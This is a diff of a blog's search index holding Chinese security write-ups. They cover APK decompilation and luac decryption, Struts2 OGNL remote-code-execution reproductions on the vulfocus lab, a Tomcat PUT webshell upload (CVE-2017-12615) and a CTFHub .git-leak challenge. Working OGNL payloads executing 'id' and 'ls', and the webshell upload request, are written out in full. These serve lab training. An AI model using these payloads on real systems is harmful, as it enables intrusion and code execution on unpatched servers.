@@ -1,6 +1,38 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>APP之反编译+目录结构+重新打包+重新签名</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
+    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
+<ol>
+<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
+<li>在cmd窗口下进入当前目录</li>
+<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
+<p>apktool d qipai.apk</p>
+</blockquote>
+</li>
+<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
+<p>apktool b test</p>
+</blockquote>
+<a id="more"></a>
+<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
+<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
+<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
+<li><strong>classes.dex</strong>：源码文件</li>
+<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
+<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
+<li><strong>META-INF</strong>：apk的签名信息</li>
+</ol>
+<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
+]]></content>
+      <categories>
+        <category>APP渗透</category>
+      </categories>
+      <tags>
+        <tag>APP反编译</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>APP反编译-下载源码</title>
     <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E5%8F%8D%E7%BC%96%E8%AF%91-%E4%B8%8B%E8%BD%BD%E6%BA%90%E7%A0%81/</url>
     <content><![CDATA[<h2 id="dex2jar工具"><a href="#dex2jar工具" class="headerlink" title="dex2jar工具"></a>dex2jar工具</h2><ol>
@@ -28,29 +60,31 @@
       </tags>
   </entry>
   <entry>
-    <title>APP之反编译+目录结构+重新打包+重新签名</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/APP%E4%B9%8B%E5%8F%8D%E7%BC%96%E8%AF%91+%E7%9B%AE%E5%BD%95%E7%BB%93%E6%9E%84+%E9%87%8D%E6%96%B0%E6%89%93%E5%8C%85+%E9%87%8D%E6%96%B0%E7%AD%BE%E5%90%8D/</url>
-    <content><![CDATA[<h2 id="反编译和重新打包-apktool"><a href="#反编译和重新打包-apktool" class="headerlink" title="反编译和重新打包-apktool"></a>反编译和重新打包-apktool</h2><p>下载地址：<a href="https://ibotpeaches.github.io/Apktool/install/">https://ibotpeaches.github.io/Apktool/install/</a></p>
+    <title>luac的解密过程</title>
+    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
 <ol>
-<li>分别下载<strong>apktool.bat</strong>、<strong>apktool.jar</strong>，并把需要反编译的APP放在同一个目录中<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081604.png" alt="image"></li>
-<li>在cmd窗口下进入当前目录</li>
-<li>执行反编译命令，反编译后的文件默认输出在当前目录下的<strong>qipai</strong>文件夹<blockquote>
-<p>apktool d qipai.apk</p>
-</blockquote>
-</li>
-<li>重新打包，默认输出<strong>qipai.apk</strong>文件为当前目录<blockquote>
-<p>apktool b test</p>
-</blockquote>
-<a id="more"></a>
-<h2 id="APP目录结构"><a href="#APP目录结构" class="headerlink" title="APP目录结构"></a>APP目录结构</h2><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081605.png" alt="image"></li>
-<li><strong>AndroidManifest.xml</strong>：安卓应用程序的全局配置文件，参考文章<a href="http://blog.chinaunix.net/uid-9185047-id-3460344.html">AndroidManifest.xml配置文件详解 </a></li>
-<li><strong>assets</strong>:系统在编译的时候不会编译assets下的资源文件,也就是说dex文件不包含此目录下的文件（此处存放业务逻辑代码，luac加密，解密key存放于<strong>lib</strong>目录下的so文件）</li>
-<li><strong>classes.dex</strong>：源码文件</li>
-<li><strong>resources.arsc</strong>：包含了已被编译好的资源的二进制格式文件。</li>
-<li><strong>res</strong>：资源文件，主要存放图片、菜单、布局文件等</li>
-<li><strong>META-INF</strong>：apk的签名信息</li>
+<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
+<li>加密key与程序内部约定某个值。</li>
 </ol>
-<h2 id="APP重新签名"><a href="#APP重新签名" class="headerlink" title="APP重新签名"></a>APP重新签名</h2><p>参考文章：<a href="https://blog.csdn.net/lyq8479/article/details/6401093">Android应用程序签名详解</a></p>
+<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
+<a id="more"></a>
+<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
+<ol>
+<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
+</li>
+<li><p>寻找加密<strong>key</strong></p>
+<ul>
+<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
+<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
+<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
+<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
+</ul>
+</li>
+<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>APP渗透</category>
@@ -120,40 +154,6 @@
       </tags>
   </entry>
   <entry>
-    <title>luac的解密过程</title>
-    <url>/2020/08/16/APP%E6%B8%97%E9%80%8F/luac%E7%9A%84%E8%A7%A3%E5%AF%86%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="加密解密思路"><a href="#加密解密思路" class="headerlink" title="加密解密思路"></a>加密解密思路</h2><p>将后缀为.luac文件放入到apk文件中，那么在程序运行时，势必需要对.luac文件进行解密，然后再加载运行文件。那程序是如何知道我们在加密key呢？有两个猜想：</p>
-<ol>
-<li>加密key写入文件，程序在解密时先读取文件中的加密key，再解密。</li>
-<li>加密key与程序内部约定某个值。</li>
-</ol>
-<p>显然，第一种可以破解，可以再程序中找到解密的值。</p>
-<a id="more"></a>
-<h2 id="寻找加密sign和key"><a href="#寻找加密sign和key" class="headerlink" title="寻找加密sign和key"></a>寻找加密sign和key</h2><p>要反编译.luac文件，需要知道加密<strong>key</strong>和<strong>sign</strong>。</p>
-<ol>
-<li><p>寻找加密<strong>sign</strong>:用记事本打开某个.luac文件，文件开头的前几个字符即加密sign</p>
-<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081606.png" alt="image"></p>
-</li>
-<li><p>寻找加密<strong>key</strong></p>
-<ul>
-<li>下载<strong>Hex Workshop</strong>工具：<a href="https://hex-workshop.en.softonic.com/download">https://hex-workshop.en.softonic.com/download</a></li>
-<li>将<strong>lib\libgame.so</strong>文件拖入工具中</li>
-<li><strong>ctrl+f</strong>查找<strong>sign</strong>的值</li>
-<li><strong>sign</strong>附近相似的值就是<strong>key</strong>的值<h2 id="解密luac文件"><a href="#解密luac文件" class="headerlink" title="解密luac文件"></a>解密luac文件</h2></li>
-</ul>
-</li>
-<li><p>下载<strong>XXTEADecrypt</strong>：<a href="http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe">http://on.wall.aldcup.com/download/XXTEA%E8%A7%A3%E5%AF%86%E5%B7%A5%E5%85%B7_0141226844.exe</a><br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081607.png" alt="image"></p>
-</li>
-</ol>
-]]></content>
-      <categories>
-        <category>APP渗透</category>
-      </categories>
-      <tags>
-        <tag>APP反编译</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>S2-019 CVE-2013-4316复现过程</title>
     <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-019%20CVE-2013-4316%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>要求开发者模式，且poc第一个参数是debug，触发点在DebuggingInterceptor上，查看intercept函数，从debug参数获取调试模式，如果模式是command，则把expression参数放到stack.findValue中，最终放到了ognl.getValue中</p>
@@ -162,26 +162,6 @@
 <h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
 <li>使用vulfocus启动环境打开url<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081401.png" alt="image"></li>
 <li>直接使用工具获得flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081402.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-046 CVE-2017-5638复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
-<a id="more"></a>
-<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
-<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
-</li>
-<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
-</li>
 </ol>
 ]]></content>
       <categories>
@@ -208,6 +188,26 @@
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">(%23_memberAccess[&#39;allowPrivateAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;excludedPackageNamePatterns&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;excludedClasses&#39;]&#x3D;%23_memberAccess[&#39;acceptProperties&#39;],%23_memberAccess[&#39;allowPackageProtectedAccess&#39;]&#x3D;true,%23_memberAccess[&#39;allowStaticMethodAccess&#39;]&#x3D;true,@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec(&#39;ls&#39;).getInputStream()))</span><br></pre></td></tr></table></figure>
 
 <p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081404.png" alt="image"></p>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>S2-046 CVE-2017-5638复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-046%20CVE-2017-5638%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>在使用基于Jakarta插件的文件上传功能时，有可能存在远程命令执行，导致系统被黑客入侵。恶意用户可在上传文件时通过修改HTTP请求头中的Content-Type值来触发该漏洞，进而执行系统命令。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts2.3.5 – 2.3.31    Struts2.5 – 2.5.10</p>
+<a id="more"></a>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><ol>
+<li><p>使用vulfocus启动环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081405.png" alt="image"></p>
+</li>
+<li><p>直接使用工具拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081406.png" alt="image"></p>
+</li>
+</ol>
 ]]></content>
       <categories>
         <category>vulfocus靶场练习</category>
@@ -263,6 +263,28 @@
       </tags>
   </entry>
   <entry>
+    <title>S2-057 CVE-2018-11776复现过程</title>
+    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
+    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
+<a id="more"></a>
+<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
+<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
+</li>
+<li><p>poc利用</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
+<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
+</li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Struts2</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>S2-053 CVE-2017-12611复现过程</title>
     <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-053%20CVE-2017-12611%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
     <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>Struts2在使用Freemarker模板引擎的时候，同时允许解析OGNL表达式。导致用户输入的数据本身不会被OGNL解析，但由于被Freemarker解析一次后变成离开一个表达式，被OGNL解析第二次，导致任意命令执行漏洞。</p>
@@ -276,28 +298,6 @@
 
 <ol start="3">
 <li>burp抓包构造payload<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081413.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>S2-057 CVE-2018-11776复现过程</title>
-    <url>/2020/08/14/Vulfocus%E9%9D%B6%E5%9C%BA/S2-057%20CVE-2018-11776%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B/</url>
-    <content><![CDATA[<h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>alwaysSelectFullNamespace为true。<br>action元素没有设置namespace属性，或者使用了通配符。<br>命名空间将由用户从url传递并解析为OGNL表达式，最终导致远程代码执行漏洞</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Struts 2.3–2.3.34<br>Struts2.5–2.5.16</p>
-<a id="more"></a>
-<h2 id="复现步骤"><a href="#复现步骤" class="headerlink" title="复现步骤"></a>复现步骤</h2><ol>
-<li><p>使用vulfocus搭建漏洞环境<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081414.png" alt="image"></p>
-</li>
-<li><p>poc利用</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;index&#x2F;%24%7B%28%23dm%3D%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS%29.%28%23ct%3D%23request%5B%27struts.valueStack%27%5D.context%29.%28%23cr%3D%23ct%5B%27com.opensymphony.xwork2.ActionContext.container%27%5D%29.%28%23ou%3D%23cr.getInstance%28%40com.opensymphony.xwork2.ognl.OgnlUtil%40class%29%29.%28%23ou.getExcludedPackageNames%28%29.clear%28%29%29.%28%23ou.getExcludedClasses%28%29.clear%28%29%29.%28%23ct.setMemberAccess%28%23dm%29%29.%28%23a%3D%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%29.%28%40org.apache.commons.io.IOUtils%40toString%28%23a.getInputStream%28%29%29%29%7D&#x2F;actionChain1.action</span><br></pre></td></tr></table></figure>
-<p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081415.png" alt="image"></p>
-</li>
 </ol>
 ]]></content>
       <categories>
@@ -349,33 +349,6 @@
       </categories>
       <tags>
         <tag>Struts2</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
-    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
-    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
-<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
-<a id="more"></a>
-<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
-<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
-</li>
-<li><p>访问页面如下：<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
-</li>
-<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="14C523405179468B8FB07461BF2ACA55" alt="image"></p>
-</li>
-</ol>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
-
-<ol start="4">
-<li>直接访问上传的木马文件，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
-</ol>
-]]></content>
-      <categories>
-        <category>vulfocus靶场练习</category>
-      </categories>
-      <tags>
-        <tag>Tomcat</tag>
       </tags>
   </entry>
   <entry>
@@ -507,6 +480,84 @@
       </tags>
   </entry>
   <entry>
+    <title>Tomcat 任意写入文件漏洞复现过程（CVE-2017-12615）</title>
+    <url>/2020/08/11/Vulfocus%E9%9D%B6%E5%9C%BA/Tomcat%20%E4%BB%BB%E6%84%8F%E5%86%99%E5%85%A5%E6%96%87%E4%BB%B6%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E8%BF%87%E7%A8%8B%EF%BC%88CVE-2017-12615%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h2><p>Apache Tomcat 7.0.0到7.0.79版本中存在远程代码执行漏洞，当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法时，攻击者可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件，文件中的代码被服务器执行。</p>
+<h2 id="影响版本"><a href="#影响版本" class="headerlink" title="影响版本"></a>影响版本</h2><p>Apache Tomcat &gt;=7.0.0，&lt;=7.0.79</p>
+<a id="more"></a>
+<h2 id="复现过程"><a href="#复现过程" class="headerlink" title="复现过程"></a>复现过程</h2><ol>
+<li><p>使用vulfocus启动漏洞环境<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081101.png" alt="image"></p>
+</li>
+<li><p>访问页面如下：<br> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081102.png" alt="image"></p>
+</li>
+<li><p>直接抓包，修改请求方式为 PUT，并且设置文件名为1.jsp(名字随意)，然后填充 shell(jsp shell即可)文件内容，发送成功后，服务器返回状态码201。我这里直接上传大马<br><img src="14C523405179468B8FB07461BF2ACA55" alt="image"></p>
+</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">PUT &#x2F;1.jsp&#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: ip</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 10.0; Win64; x64; rv:76.0) Gecko&#x2F;20100101 Firefox&#x2F;76.0</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,*&#x2F;*;q&#x3D;0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.8,zh-TW;q&#x3D;0.7,zh-HK;q&#x3D;0.5,en-US;q&#x3D;0.3,en;q&#x3D;0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">DNT: 1</span><br><span class="line">Connection: close</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Content-Length: 60577</span><br><span class="line"></span><br><span class="line">shell</span><br></pre></td></tr></table></figure>
+
+<ol start="4">
+<li>直接访问上传的木马文件，拿到flag<br><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081103.png" alt="image"></li>
+</ol>
+]]></content>
+      <categories>
+        <category>vulfocus靶场练习</category>
+      </categories>
+      <tags>
+        <tag>Tomcat</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Web基础之信息泄露（下）</title>
+    <url>/2020/08/18/Web%E5%9F%BA%E7%A1%80/CTFHub%E9%A2%98%E8%A7%A3-Web%E5%9F%BA%E7%A1%80%E4%B9%8B%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%EF%BC%88%E4%B8%8B%EF%BC%89/</url>
+    <content><![CDATA[<h2 id="Git泄露"><a href="#Git泄露" class="headerlink" title="Git泄露"></a>Git泄露</h2><p>以下需要用到python脚本：Githack<br><a href="https://github.com/BugScanTeam/GitHack">https://github.com/BugScanTeam/GitHack</a></p>
+<h3 id="log"><a href="#log" class="headerlink" title="log"></a>log</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081824.png" alt="image"></p>
+<h4 id="知识点"><a href="#知识点" class="headerlink" title="知识点"></a>知识点</h4><p>查看历史记录</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git log</span><br></pre></td></tr></table></figure>
+<p>切换版本</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git reset</span><br></pre></td></tr></table></figure>
+<p>对比两次提交</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git diff</span><br></pre></td></tr></table></figure>
+<h4 id="题解"><a href="#题解" class="headerlink" title="题解"></a>题解</h4><ol>
+<li><p>扫描发现 .git 泄露</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081825.png" alt="image"></p>
+</li>
+<li><p>使用 GitHack 工具 clone 目标源代码到本地</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081826.png" alt="image"></p>
+</li>
+<li><p>执行 git log 查看历史记录</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081827.png" alt="image"></p>
+</li>
+<li><p>执行 git show 查看提交详情</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081828.png" alt="image"></p>
+<h3 id="Stash"><a href="#Stash" class="headerlink" title="Stash"></a>Stash</h3><h4 id="知识点-1"><a href="#知识点-1" class="headerlink" title="知识点"></a>知识点</h4><p>git 泄露 .git/refs/stash</p>
+</li>
+</ol>
+<p>stash 用于保存 git 工作状态到 git 栈，在需要的时候再恢复。</p>
+<h4 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h4><ol>
+<li><p>尝试访问敏感目录，发现.git目录<strong><a href="http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config">http://challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080/.git/config</a></strong></p>
+</li>
+<li><p>利用GitHack 工具将网站源代码 clone 到本地</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python GitHack.py http:&#x2F;&#x2F;challenge-b48a889fd49f7430.sandbox.ctfhub.com:10080&#x2F;.git&#x2F;</span><br></pre></td></tr></table></figure>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081829.png" alt="image"></p>
+</li>
+<li><p>查看 <strong>.git/refs/stash</strong> 找到 <strong>stash</strong> 对应的 <strong>hash</strong></p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081830.png" alt="image"></p>
+</li>
+<li><p>git diff 9dbafcb8c4629b4b843991b6ebe5eca874812fc4 得到flag</p>
+<p> <img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081831.png" alt="image"></p>
+</li>
+</ol>
+<h3 id="Index"><a href="#Index" class="headerlink" title="Index"></a>Index</h3><p><img src="http://qgsmrtll0.hn-bkt.clouddn.com/tp2020081832.png" alt="image"></p>
